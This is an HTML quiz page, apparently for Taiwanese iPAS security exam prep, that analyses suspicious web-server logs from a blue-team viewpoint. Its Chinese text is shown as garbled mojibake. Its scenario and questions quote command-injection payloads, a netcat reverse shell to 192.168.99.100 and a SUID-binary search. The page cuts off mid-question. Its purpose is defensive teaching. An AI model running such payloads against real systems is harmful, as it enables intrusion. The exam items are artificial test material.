<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPAS è³‡å®‰é¡Œçµ„ï¼šæŒ‡ä»¤æ³¨å…¥èˆ‡æ¬Šé™æå‡åˆ†æ</title>
    <style>
        :root {
            /* æ¨™ç±¤ç³»çµ±é…è‰² */
            --tag-law: #607d8b;
            --tag-iso: #27ae60;
            --tag-zt: #8e44ad;
            --tag-net: #2980b9;
            --tag-sec: #c0392b;
            --tag-mgm: #d35400;

            /* UI ç³»çµ±è‰² */
            --primary-bg: #f4f6f8;
            --card-bg: #ffffff;
            --text-main: #2c3e50;
            --text-sub: #7f8c8d;
            --accent: #3498db;
            --success: #2ecc71;
            --error: #e74c3c;
            --locked: #95a5a6;
            
            /* ç‹€æ…‹èƒŒæ™¯ */
            --bg-correct: #e8f5e9;
            --bg-wrong: #fce4ec;
            
            /* å­—é«” */
            --font-stack: system-ui, "Noto Sans TC", "Microsoft JhengHei", sans-serif;
        }

        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: var(--font-stack);
            background-color: var(--primary-bg);
            color: var(--text-main);
            margin: 0;
            padding: 20px;
            line-height: 1.6;
            font-size: 16px;
        }

        /* å®¹å™¨èˆ‡ä½ˆå±€ */
        .container {
            max-width: 960px;
            margin: 0 auto;
            padding-bottom: 60px;
        }

        /* é é¦– Header */
        header {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            margin-bottom: 24px;
            position: relative;
        }

        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        h1 {
            margin: 0;
            font-size: 1.4rem;
            color: var(--text-main);
        }

        .progress-stat {
            font-weight: bold;
            color: var(--accent);
            font-family: monospace;
            font-size: 1.1rem;
        }

        .progress-track {
            height: 8px;
            background: #eee;
            border-radius: 4px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--accent), #2980b9);
            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        /* é¡Œçµ„èƒŒæ™¯ (Global Context) */
        .group-scenario {
            background: #e3f2fd;
            border-left: 5px solid var(--accent);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 24px;
            font-size: 0.95rem;
        }
        
        .scenario-label {
            font-weight: bold;
            color: var(--tag-net);
            display: block;
            margin-bottom: 8px;
        }

        .code-block {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 12px;
            border-radius: 6px;
            font-family: monospace;
            margin: 10px 0;
            overflow-x: auto;
            border: 1px solid #34495e;
        }

        /* Tabs åˆ†é åˆ‡æ› */
        .tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 24px;
            overflow-x: auto;
            padding-bottom: 4px;
            scrollbar-width: none; /* Firefox */
        }
        .tabs::-webkit-scrollbar { display: none; } /* Chrome/Safari */

        .tab-btn {
            padding: 10px 20px;
            border: none;
            background: #e0e0e0;
            border-radius: 24px;
            cursor: pointer;
            white-space: nowrap;
            font-weight: bold;
            color: #666;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
            min-height: 48px; /* è§¸æ§å‹å–„ */
        }

        .tab-btn.active {
            background: var(--text-main);
            color: white;
            box-shadow: 0 4px 10px rgba(44, 62, 80, 0.3);
        }

        .tab-btn.correct { background: var(--success); color: white; }
        .tab-btn.wrong { background: var(--error); color: white; }

        /* å¡ç‰‡è¨­è¨ˆ */
        .card {
            background: var(--card-bg);
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            padding: 24px;
            margin-bottom: 24px;
            display: none; /* é è¨­éš±è—ï¼Œç”± JS æ§åˆ¶é¡¯ç¤º */
            animation: fadeIn 0.4s ease;
        }

        .card.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* é¡Œç›®å…§å®¹ */
        .q-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 16px;
        }

        .q-tag {
            font-size: 0.8rem;
            padding: 4px 10px;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            background: var(--tag-sec); /* é è¨­ */
        }
        /* Tag classes dynamically applied via JS */
        .tag-law { background: var(--tag-law); }
        .tag-iso { background: var(--tag-iso); }
        .tag-zt { background: var(--tag-zt); }
        .tag-net { background: var(--tag-net); }
        .tag-sec { background: var(--tag-sec); }
        .tag-mgm { background: var(--tag-mgm); }

        .q-text {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 20px;
        }

        /* é—œéµå­—å¼·èª¿ - ç´…è‰²åŠ ç²— */
        .highlight-negative {
            color: #c0392b;
            font-weight: 900;
            text-decoration: underline;
            text-decoration-thickness: 2px;
        }

        /* é¸é …å€åŸŸ */
        .options-area {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .option-label {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 2px solid #eee;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
            background: #fff;
            min-height: 44px; /* è§¸æ§å‹å–„ */
        }

        .option-label:hover:not(.disabled) {
            border-color: var(--accent);
            background: #fbfbfb;
        }

        .option-label.disabled {
            cursor: not-allowed;
            opacity: 0.9;
        }

        /* é¸é …ä»£è™Ÿ (A, B, C...) */
        .opt-code {
            font-weight: bold;
            margin-right: 12px;
            color: var(--accent);
            min-width: 24px;
        }

        .option-input {
            position: absolute;
            opacity: 0;
            height: 0;
            width: 0;
        }

        /* é¸é …é¸ä¸­èˆ‡å°éŒ¯æ¨£å¼ */
        .option-label.selected {
            border-color: var(--accent);
            background-color: #e3f2fd;
        }

        .option-label.correct {
            border-color: var(--success);
            background-color: var(--bg-correct);
            color: #1b5e20;
        }
        .option-label.correct .opt-code { color: #1b5e20; }
        .option-label.correct::after {
            content: "âœ“";
            position: absolute;
            right: 15px;
            font-weight: bold;
            color: var(--success);
        }

        .option-label.wrong {
            border-color: var(--error);
            background-color: var(--bg-wrong);
            color: #b71c1c;
        }
        .option-label.wrong .opt-code { color: #b71c1c; }
        .option-label.wrong::after {
            content: "âœ•";
            position: absolute;
            right: 15px;
            font-weight: bold;
            color: var(--error);
        }

        /* åˆ¤å®šæŒ‰éˆ•å€ */
        .action-area {
            margin-top: 24px;
            display: flex;
            justify-content: flex-end;
        }

        .btn {
            padding: 12px 32px;
            border-radius: 30px;
            border: none;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.1s;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .btn:active { transform: scale(0.98); }

        .btn-submit { background: var(--text-main); color: white; }
        .btn-retry { background: var(--locked); color: white; display: none; }

        /* æ–°ç‰ˆè©³è§£å€å¡Šæ¨£å¼ */
        .explain-section {
            margin-top: 30px;
            border-top: 2px dashed #e0e0e0;
            padding-top: 20px;
            display: none;
        }

        .step-block {
            margin-bottom: 20px;
            background: #fff;
            border: 1px solid #eee;
            border-radius: 8px;
            padding: 16px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
        }

        .step-title {
            font-weight: bold;
            color: var(--accent);
            font-size: 1.05rem;
            margin-bottom: 10px;
            border-bottom: 2px solid var(--accent);
            display: inline-block;
            padding-bottom: 2px;
        }

        .step-content {
            font-size: 0.95rem;
            color: #444;
            line-height: 1.7;
        }

        .step-content ul {
            padding-left: 20px;
            margin: 8px 0;
        }

        .highlight-box {
            background: #fdf2e9;
            border-left: 4px solid #d35400;
            padding: 10px 15px;
            margin: 10px 0;
            border-radius: 4px;
        }
        
        .keyword-badge {
            display: inline-block;
            background: #e8f6f3;
            color: #16a085;
            padding: 2px 8px;
            border-radius: 4px;
            font-family: monospace;
            font-weight: bold;
            margin-right: 5px;
        }

        /* é¸é …åˆ†æè¡¨æ ¼ */
        .option-analysis-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        .option-analysis-table td {
            padding: 8px;
            border-bottom: 1px solid #eee;
            vertical-align: top;
        }
        .oa-label { font-weight: bold; color: var(--accent); white-space: nowrap; width: 40px; }
        .oa-status { font-weight: bold; font-size: 0.8rem; padding: 2px 6px; border-radius: 4px; margin-right: 5px; white-space: nowrap;}
        .oa-correct { background: #e8f5e9; color: #2ecc71; }
        .oa-wrong { background: #ffebee; color: #e74c3c; }

        /* è‡ªæˆ‘æª¢æ¸¬æ¨£å¼ */
        .self-check-container {
            margin-top: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            border: 1px solid #e9ecef;
        }
        
        .self-check-title {
            font-weight: bold;
            color: var(--text-main);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
        }
        .self-check-title::before {
            content: "ğŸ§ ";
            margin-right: 8px;
        }

        .sc-item {
            margin-bottom: 15px;
            border-bottom: 1px dashed #ced4da;
            padding-bottom: 10px;
        }
        .sc-item:last-child { border-bottom: none; }

        .sc-question { font-weight: 600; margin-bottom: 8px; color: #34495e; }
        
        .sc-answer-btn {
            background: #95a5a6;
            color: white;
            border: none;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 0.85rem;
            cursor: pointer;
        }
        
        .sc-answer-content {
            margin-top: 8px;
            color: var(--success);
            font-weight: bold;
            display: none;
            background: #fff;
            padding: 8px;
            border-radius: 4px;
            border-left: 3px solid var(--success);
        }

        /* æ‰‹æ©Ÿç‰ˆé©æ‡‰ */
        @media (max-width: 768px) {
            body { padding: 10px; }
            .container { width: 100%; }
            .tabs { margin-left: -10px; margin-right: -10px; padding-left: 10px; padding-right: 10px; }
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="header-top">
            <h1>iPAS è³‡å®‰å¯¦å‹™é¡Œçµ„è§£æ</h1>
            <div class="progress-stat"><span id="completed-count">0</span> / <span id="total-count">0</span></div>
        </div>
        <div class="progress-track">
            <div class="progress-bar" id="global-progress"></div>
        </div>
    </header>

    <div class="group-scenario">
        <span class="scenario-label">ã€é¡Œçµ„æƒ…å¢ƒã€‘Blue Team äº‹ä»¶èª¿æŸ¥</span>
        <p>ä½ æ˜¯ä¼æ¥­è—éšŠï¼ˆé˜²ç¦¦æ–¹ï¼‰äººå“¡ï¼Œæ­£åœ¨èª¿æŸ¥ä¸€å°ç–‘ä¼¼é­åˆ°æ”»æ“Šçš„ Web ä¼ºæœå™¨ã€‚SOCï¼ˆè³‡å®‰ç›£æ§ä¸­å¿ƒï¼‰ç™¼å‡ºå‘Šè­¦ï¼ŒæŒ‡å‡ºè©²ä¼ºæœå™¨çš„ Ping åŠŸèƒ½ï¼ˆæ¸¬è©¦ç¶²è·¯é€£ç·šå·¥å…·ï¼‰å‡ºç¾ç•°å¸¸æµé‡ã€‚ä½ åœ¨æ‡‰ç”¨ç¨‹å¼æ—¥èªŒï¼ˆApp Logsï¼‰èˆ‡ç³»çµ±æŒ‡ä»¤æ—¥èªŒï¼ˆCommand Logsï¼‰ä¸­ç™¼ç¾äº†ä»¥ä¸‹å¯ç–‘ç´€éŒ„ï¼š</p>
        <div class="code-block">
127.0.0.1; sleep 5
127.0.0.1; whoami
127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt
find / -perm -u=s -type f 2>/dev/null
        </div>
        <p>è«‹æ ¹æ“šé€™äº›æ—¥èªŒç·šç´¢ï¼Œå›ç­”ä¸‹åˆ—ç¬¬ 33 è‡³ 36 é¡Œã€‚</p>
    </div>

    <!-- å°èˆªåˆ†é  -->
    <div class="tabs" id="tabs-container">
        <!-- JS å‹•æ…‹ç”Ÿæˆ -->
    </div>

    <!-- é¡Œç›®å®¹å™¨ -->
    <div id="questions-container">
        <!-- JS å‹•æ…‹ç”Ÿæˆ -->
    </div>

</div>

<script>
// ==========================================
// 1. è³‡æ–™å®šç¾© (Data Model)
// ==========================================
const quizData = {
  "groupTitle": "æŒ‡ä»¤æ³¨å…¥èˆ‡æ¬Šé™æå‡",
  "questions": [
    {
      "id": 33,
      "tag": "tech",
      "tagName": "Web æ”»æ“ŠæŠ€è¡“",
      "type": "single",
      "text": "æ—¥èªŒä¸­å‡ºç¾ã€Œ127.0.0.1; sleep 5ã€ï¼Œè«‹å•æ”»æ“Šè€…æœ€å¯èƒ½æ­£åœ¨æ¸¬è©¦ä¸‹åˆ—å“ªä¸€ç¨®æ”»æ“Šæƒ…å¢ƒï¼Ÿ",
      "options": [
        "æ”»æ“Šè€…æƒ³ç¢ºèªè©²åŠŸèƒ½æ˜¯å¦å­˜åœ¨è³‡æ–™åº«æ³¨å…¥æ”»æ“Šï¼ˆSQL Injectionï¼‰",
        "æ”»æ“Šè€…æƒ³ç¢ºèªè©²åŠŸèƒ½æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ”»æ“Šï¼ˆInsecure Deserializationï¼‰",
        "æ”»æ“Šè€…æƒ³ç¢ºèªè©²åŠŸèƒ½æ˜¯å¦å­˜åœ¨æŒ‡ä»¤æ³¨å…¥æ”»æ“Šï¼ˆCommand Injectionï¼‰",
        "æ”»æ“Šè€…æƒ³ç¢ºèªè©²åŠŸèƒ½æ˜¯å¦å­˜åœ¨è³‡å®‰è¨˜éŒ„åŠç›£æ§å¤±æ•ˆï¼ˆSecurity Logging Failuresï¼‰"
      ],
      "correctIndex": 2, // (C)
      "explanation": {
          "keywords": [
              { "word": ";", "desc": "æŒ‡ä»¤åˆ†éš”ç¬¦è™Ÿ (Linux/Unix)" },
              { "word": "sleep 5", "desc": "æ™‚é–“å»¶é²æŒ‡ä»¤ (Time Delay)" },
              { "word": "127.0.0.1", "desc": "æ­£å¸¸è¼¸å…¥æ©è­·" }
          ],
          "translation": "ã€Œç³»çµ±ä½ å¥½ï¼Œè«‹å¹«æˆ‘ Ping é€™å€‹ IPï¼Œåšå®Œä¹‹å¾Œï¼Œ<strong>é †ä¾¿ç¡å€‹ 5 ç§’é˜</strong>ã€‚ã€",
          "logic": {
              "steps": [
                  "æ”»æ“Šè€…åœ¨æ­£å¸¸åƒæ•¸å¾ŒåŠ å…¥åˆ†è™Ÿã€Œ;ã€ï¼Œè©¦åœ–ä¸²æ¥ç¬¬äºŒå€‹æŒ‡ä»¤ã€‚",
                  "ç¬¬äºŒå€‹æŒ‡ä»¤æ˜¯ã€Œsleep 5ã€ï¼Œé€™æ˜¯ä¸€å€‹ä½œæ¥­ç³»çµ±å±¤ç´šçš„æŒ‡ä»¤ã€‚",
                  "å¦‚æœç¶²é å›æ‡‰çœŸçš„åœé “äº† 5 ç§’ï¼Œä»£è¡¨ç³»çµ±çœŸçš„åŸ·è¡Œäº†é€™å€‹ã€Œé¡å¤–æŒ‡ä»¤ã€ã€‚",
                  "é€™ç¨®æ‰‹æ³•ç¨±ç‚ºã€Œç›²æ³¨æ¸¬è©¦ï¼ˆBlind Injectionï¼‰ã€ï¼Œç”¨ä¾†ç¢ºèªæ¼æ´æ˜¯å¦å­˜åœ¨ã€‚"
              ],
              "principle": "æŒ‡ä»¤æ³¨å…¥ï¼ˆCommand Injectionï¼‰ç™¼ç”Ÿåœ¨æ‡‰ç”¨ç¨‹å¼ç›´æ¥å°‡ä½¿ç”¨è€…è¼¸å…¥å‚³éçµ¦ç³»çµ± Shell åŸ·è¡Œï¼Œä¸”æœªéæ¿¾ç‰¹æ®Šç¬¦è™Ÿï¼ˆå¦‚ ; | &ï¼‰ã€‚",
              "example": "å°±åƒä½ åœ¨é¤å»³é»é¤å–®ä¸Šå¯«ï¼šã€Œæˆ‘è¦ä¸€ä»½ç‚’é£¯ï¼›<strong>é †ä¾¿æŠŠæ”¶éŠ€æ©Ÿæ‰“é–‹</strong>ã€ã€‚å¦‚æœåº—å“¡çœŸçš„å»é–‹æ”¶éŠ€æ©Ÿï¼Œå°±ä»£è¡¨é€™å®¶åº—çš„æµç¨‹æœ‰æ¼æ´ã€‚"
          },
          "options_analysis": [
              { "idx": 0, "status": "wrong", "reason": "SQL Injection é€šå¸¸æœƒå‡ºç¾å–®å¼•è™Ÿ (')ã€OR 1=1 æˆ–è³‡æ–™åº«èªæ³• (SELECT, UNION)ï¼Œè€Œéç³»çµ±æŒ‡ä»¤ã€‚" },
              { "idx": 1, "status": "wrong", "reason": "ååºåˆ—åŒ–æ”»æ“Šé€šå¸¸æ¶‰åŠç¶“éç·¨ç¢¼çš„ç‰©ä»¶è³‡æ–™ä¸² (Serialized Object)ï¼Œç‰¹å¾µç¢¼å®Œå…¨ä¸åŒã€‚" },
              { "idx": 2, "status": "correct", "reason": "ç¬¦åˆç‰¹å¾µï¼šä½¿ç”¨åˆ†è™Ÿä¸²æ¥ OS æŒ‡ä»¤ (sleep)ï¼Œç›´æ¥æ“ä½œä½œæ¥­ç³»çµ±ã€‚" },
              { "idx": 3, "status": "wrong", "reason": "é€™æ˜¯ç®¡ç†ç–å¤±çš„é¢¨éšªåˆ†é¡åç¨± (OWASP Top 10)ï¼Œä¸æ˜¯å…·é«”çš„æ”»æ“Šèªæ³•ã€‚" }
          ],
          "supplement": {
              "content": "æŒ‡ä»¤æ³¨å…¥å¸¸è¦‹çš„åˆ†éš”ç¬¦è™ŸåŒ…æ‹¬ï¼š `;` (æ¥çºŒåŸ·è¡Œ)ã€`|` (ç®¡ç·šè¼¸å‡º)ã€`&&` (å‰æˆåŠŸæ‰åŸ·è¡Œå¾Œ)ã€`||` (å‰å¤±æ•—æ‰åŸ·è¡Œå¾Œ)ã€‚",
              "definition": "Command Injectionï¼šæŒ‡æ”»æ“Šè€…é€éæ‡‰ç”¨ç¨‹å¼è¼¸å…¥ä½å…ƒçµ„ï¼Œåœ¨ä¸»æ©Ÿä½œæ¥­ç³»çµ±ä¸ŠåŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚"
          },
          "analogy": "SQL Injection æ˜¯é¨™ã€Œè³‡æ–™åº«ã€èªªè©±ï¼›Command Injection æ˜¯é¨™ã€Œä½œæ¥­ç³»çµ±ã€åšäº‹ã€‚",
          "mnemonics": "çœ‹åˆ°åˆ†è™ŸåŠ æŒ‡ä»¤ï¼Œå°±æ˜¯ Command Injectionï¼›sleep æ˜¯ç”¨ä¾†è©¦æ°´æº«çš„ã€‚",
          "traps": {
              "blind_spot": "çœ‹åˆ°ã€Œæ³¨å…¥ã€å…©å€‹å­—å°±ç›´è¦ºé¸ SQL Injectionï¼Œå¿½ç•¥äº†å¾Œé¢çš„æŒ‡ä»¤å…§å®¹æ˜¯ OS å±¤ç´šçš„ã€‚",
              "guide": "åˆ¤æ–·é—œéµåœ¨æ–¼ã€Œæ³¨å…¥äº†ä»€éº¼èªè¨€ã€ï¼Ÿæ³¨å…¥ SQL èªæ³• = SQLiï¼›æ³¨å…¥ Shell æŒ‡ä»¤ = CMDiã€‚"
          },
          "self_check": [
              { "q": "å¦‚æœæ—¥èªŒæ”¹æˆ `127.0.0.1 && id`ï¼Œé€™æ˜¯ä»€éº¼æ”»æ“Šï¼Ÿ", "a": "ä¸€æ¨£æ˜¯ Command Injectionã€‚&& ä»£è¡¨å‰é¢çš„ Ping æˆåŠŸå¾Œï¼Œæ¥è‘—åŸ·è¡Œ id æŒ‡ä»¤ã€‚" },
              { "q": "ç‚ºä»€éº¼æ”»æ“Šè€…å–œæ­¡ç”¨ sleep æ¸¬è©¦ï¼Ÿ", "a": "å› ç‚ºå¦‚æœä¸ç¢ºå®šæ˜¯å¦æœ‰å›é¡¯ï¼ˆè¢å¹•ä¸Šä¸ä¸€å®šçœ‹å¾—åˆ°çµæœï¼‰ï¼Œç”¨æ™‚é–“å»¶é²ï¼ˆå¡ä½å¹¾ç§’ï¼‰æ˜¯æœ€ç›´è§€çš„åˆ¤æ–·æ–¹å¼ã€‚" }
          ]
      }
    },
    {
      "id": 34,
      "tag": "tech",
      "tagName": "æ¬Šé™è©•ä¼°",
      "type": "single",
      "text": "æ—¥èªŒä¸­å‡ºç¾ã€Œ127.0.0.1; whoamiã€ï¼Œè«‹å•æ”»æ“Šè€…æƒ³è¦è©•ä¼°ä¸‹åˆ—ä½•é …è³‡è¨Šï¼Ÿ",
      "options": [
        "è©•ä¼°æ­¤ä½œæ¥­ç³»çµ±ç‰ˆæœ¬æ˜¯å¦æœ‰ç¾æˆçš„æ¼æ´å¯ä»¥åˆ©ç”¨",
        "è©•ä¼°è©²ä½¿ç”¨è€…æ˜¯å¦æœ‰è¶³å¤ çš„æ¬Šé™å¯ä»¥å­˜å–æ©Ÿæ•è³‡æ–™",
        "è©•ä¼°è©²ä½¿ç”¨è€…çš„ç¾¤çµ„æ˜¯å¦æœ‰è¶³å¤ çš„æ¬Šé™å¯ä»¥å­˜å–æ©Ÿæ•è³‡æ–™",
        "è©•ä¼°ç•¶ä¸‹çš„ç³»çµ±è·¯å¾‘ä½æ–¼å“ªå€‹ç›®éŒ„ä¸­"
      ],
      "correctIndex": 1, 
      "explanation": {
          "keywords": [
              { "word": "whoami", "desc": "Linux æ¨™æº–æŒ‡ä»¤ï¼šæˆ‘æ˜¯èª°ï¼Ÿ" }
          ],
          "translation": "ã€Œç³»çµ±è«‹å‘Šè¨´æˆ‘ï¼Œç¾åœ¨å¹«æˆ‘åŸ·è¡Œç¨‹å¼çš„é€™å€‹å¸³è™Ÿåå­—å«ä»€éº¼ï¼Ÿã€",
          "logic": {
              "steps": [
                  "æ”»æ“Šè€…ç¢ºèªæŒ‡ä»¤æ³¨å…¥æ¼æ´å­˜åœ¨å¾Œï¼Œä¸‹ä¸€æ­¥æ˜¯ã€Œæ¬Šé™ç›¤é»ã€ã€‚",
                  "åŸ·è¡Œ `whoami` æœƒå›å‚³ä½¿ç”¨è€…åç¨±ï¼ˆä¾‹å¦‚ `root`, `www-data`, `admin`ï¼‰ã€‚",
                  "ä½¿ç”¨è€…åç¨±ç›´æ¥æ±ºå®šäº†æ¬Šé™å¤§å°ï¼ˆèƒ½å¦è®€å– /etc/shadowã€èƒ½å¦å¯«å…¥æª”æ¡ˆç­‰ï¼‰ã€‚"
              ],
              "principle": "æœ€å°æ¬Šé™åŸå‰‡ï¼ˆLeast Privilegeï¼‰ï¼šWeb æœå‹™æ‡‰è©²ä½¿ç”¨ä½æ¬Šé™å¸³è™Ÿï¼ˆå¦‚ www-dataï¼‰é‹è¡Œï¼Œä»¥é™ä½è¢«å…¥ä¾µå¾Œçš„æå®³ã€‚",
              "example": "å°±åƒé—–ç©ºé–€çš„å°å·é€²å±‹å¾Œï¼Œå…ˆçœ‹çœ‹è‡ªå·±ç©¿çš„æ˜¯ã€Œæ¸…æ½”å·¥åˆ¶æœã€é‚„æ˜¯ã€Œç¸½ç¶“ç†è¥¿è£ã€ï¼Œæ±ºå®šèƒ½é€²å“ªäº›æˆ¿é–“ã€‚"
          },
          "options_analysis": [
              { "idx": 0, "status": "wrong", "reason": "æŸ¥ OS ç‰ˆæœ¬é€šå¸¸ç”¨ `uname -a` æˆ– `cat /etc/*release`ã€‚" },
              { "idx": 1, "status": "correct", "reason": "ç¢ºèªã€Œæˆ‘æ˜¯èª°ã€å°±æ˜¯åœ¨ç¢ºèªã€Œæˆ‘æœ‰ä»€éº¼æ¬Šé™ã€ã€‚" },
              { "idx": 2, "status": "wrong", "reason": "æŸ¥ç¾¤çµ„é€šå¸¸ä½¿ç”¨ `id` æˆ– `groups` æŒ‡ä»¤ï¼Œwhoami ä¸»è¦åªé¡¯ç¤ºåç¨±ã€‚" },
              { "idx": 3, "status": "wrong", "reason": "æŸ¥è·¯å¾‘ä½¿ç”¨ `pwd` (Print Working Directory)ã€‚" }
          ],
          "supplement": {
              "content": "è‹¥å›å‚³ `root`ï¼Œä»£è¡¨æ”»æ“Šè€…æ“æœ‰æœ€é«˜æ¬Šé™ï¼ˆGod Modeï¼‰ï¼›è‹¥å›å‚³ `www-data` æˆ– `apache`ï¼Œå‰‡æ¬Šé™å—é™ï¼Œé€šå¸¸éœ€è¦é€²ä¸€æ­¥ææ¬Šï¼ˆPrivilege Escalationï¼‰ã€‚",
              "definition": "Situational Awareness (æƒ…å¢ƒæ„ŸçŸ¥)ï¼šæ”»æ“Šè€…å…¥ä¾µå¾Œç¢ºèªç’°å¢ƒèˆ‡è‡ªèº«æ¬Šé™çš„éç¨‹ã€‚"
          },
          "analogy": "whoami æ˜¯çœ‹èº«ä»½è­‰ï¼›pwd æ˜¯çœ‹å°èˆªåœ°åœ–ï¼›id æ˜¯çœ‹æœƒå“¡å¡ç­‰ç´šã€‚",
          "mnemonics": "whoami å•èº«åˆ†ï¼Œæ¨æ¬Šé™ï¼›id çœ‹ç¾¤çµ„ï¼Œpwd çœ‹è·¯å¾‘ã€‚",
          "traps": {
              "blind_spot": "å®¹æ˜“æ··æ·†ã€Œä½¿ç”¨è€…åç¨±ã€èˆ‡ã€Œç¾¤çµ„ã€æˆ–ã€Œè·¯å¾‘ã€çš„æŒ‡ä»¤å°æ‡‰é—œä¿‚ã€‚",
              "guide": "çœ‹åˆ° whoami ç›´è­¯å°±æ˜¯ã€ŒWho am Iã€ï¼Œè·Ÿåœ°é»ï¼ˆè·¯å¾‘ï¼‰æˆ–ç‰ˆæœ¬ç„¡é—œã€‚"
          },
          "self_check": [
              { "q": "å¦‚æœæ”»æ“Šè€…åŸ·è¡Œ `id`ï¼Œä»–èƒ½å¤šçœ‹åˆ°ä»€éº¼è³‡è¨Šï¼Ÿ", "a": "é™¤äº†ä½¿ç”¨è€… ID (uid)ï¼Œé‚„èƒ½çœ‹åˆ°ç¾¤çµ„ ID (gid) ä»¥åŠæ‰€å±¬çš„è£œå……ç¾¤çµ„ï¼Œè³‡è¨Šæ¯” whoami æ›´è©³ç´°ã€‚" },
              { "q": "ç‚ºä»€éº¼æ”»æ“Šè€…å¾ˆåœ¨æ„æ˜¯ä¸æ˜¯ rootï¼Ÿ", "a": "å› ç‚º root å¯ä»¥ä»»æ„è®€å¯«ç³»çµ±æª”æ¡ˆã€å®‰è£å¾Œé–€ã€æ¸…é™¤æ—¥èªŒï¼Œå®Œå…¨æ§åˆ¶æ•´å°æ©Ÿå™¨ã€‚" }
          ]
      }
    },
    {
      "id": 35,
      "tag": "net",
      "tagName": "æƒ¡æ„é€£ç·šåˆ†æ",
      "type": "single",
      "text": "æ—¥èªŒä¸­å‡ºç¾ã€Œ... /bin/bash -i ... | nc 192.168.99.100 80 ...ã€ï¼Œé€™æ®µæŒ‡ä»¤æœ€å¯èƒ½ä»£è¡¨ä»€éº¼æ”»æ“Šæƒ…å¢ƒï¼Ÿ",
      "options": [
        "æ”»æ“Šè€…æƒ³è¦å‹˜æŸ¥ 192.168.99.100 çš„ 80 port æ˜¯å¦å¯é€²è¡Œé€£ç·š",
        "æ”»æ“Šè€…æƒ³è¦è®€å– /bin/bash é€™å€‹æª”æ¡ˆå…§å®¹ä¸¦è¼¸å‡º",
        "æ”»æ“Šè€…æƒ³è¦é€é nc é€²è¡Œåå‘é€£ç·šï¼ˆReverse Shellï¼‰ï¼Œå–å¾—é ç«¯æ§åˆ¶æ¬Š",
        "æ”»æ“Šè€…æƒ³è¦è®€å–ä½œæ¥­ç³»çµ±ç‰ˆæœ¬è³‡è¨Šä»¥å°‹æ‰¾æ¼æ´"
      ],
      "correctIndex": 2,
      "explanation": {
          "keywords": [
              { "word": "bash -i", "desc": "å•Ÿå‹•äº’å‹•å¼ Shell (Interactive)" },
              { "word": "|", "desc": "ç®¡ç·šï¼šæŠŠå·¦é‚Šçµæœå‚³çµ¦å³é‚Š" },
              { "word": "nc", "desc": "Netcatï¼šç¶²è·¯ç‘å£«åˆ€ï¼Œå»ºç«‹é€£ç·šç”¨" },
              { "word": "192.168.99.100", "desc": "æ”»æ“Šè€…çš„ IP (å¤–éƒ¨)" }
          ],
          "translation": "ã€Œè«‹å•Ÿå‹•ä¸€å€‹çµ‚ç«¯æ©Ÿä»‹é¢ (bash)ï¼Œä¸¦æŠŠå®ƒã€æ¥ã€åˆ°é ç«¯çš„æ”»æ“Šè€…é›»è…¦ä¸Šï¼Œè®“æ”»æ“Šè€…å¯ä»¥ç›´æ¥ä¸‹æŒ‡ä»¤æ§åˆ¶æˆ‘ã€‚ã€",
          "logic": {
              "steps": [
                  "æ”»æ“Šè€…åˆ©ç”¨ `bash -i` ç”¢ç”Ÿä¸€å€‹å¯è¼¸å…¥æŒ‡ä»¤çš„ç’°å¢ƒã€‚",
                  "é€é `nc` (Netcat) é€£ç·šåˆ°æ”»æ“Šè€…çš„ IPã€‚",
                  "å°‡ bash çš„è¼¸å…¥/è¼¸å‡º (I/O) è½‰å°çµ¦æ”»æ“Šè€…ã€‚",
                  "å› ç‚ºæ˜¯ç”±å…§éƒ¨ä¸»å‹•é€£å‡ºå»ï¼Œæ‰€ä»¥ç¨±ç‚ºã€Œåå‘ (Reverse)ã€é€£ç·šã€‚"
              ],
              "principle": "åå‘ Shell (Reverse Shell)ï¼šåˆ©ç”¨é˜²ç«ç‰†é€šå¸¸ã€Œæ“‹å…¥ä¸æ“‹å‡ºã€çš„ç‰¹æ€§ï¼Œç”±å—å®³ç«¯ä¸»å‹•é€£ç·šå›æ”»æ“Šç«¯ï¼Œè—‰æ­¤ç¹éé˜²ç«ç‰†é™åˆ¶ã€‚",
              "example": "å°±åƒå°å·åœ¨ä½ å®¶è£äº†å…§ç·šé›»è©±ï¼Œå«ä½ ä¸»å‹•æ‰“çµ¦ä»–è½å€™å·®é£ã€‚è­¦è¡›ï¼ˆé˜²ç«ç‰†ï¼‰æœƒæ“‹å¤–ä¾†é›»è©±ï¼Œä½†é€šå¸¸ä¸æœƒæ“‹ä½ æ‰“å‡ºå»çš„é›»è©±ã€‚"
          },
          "options_analysis": [
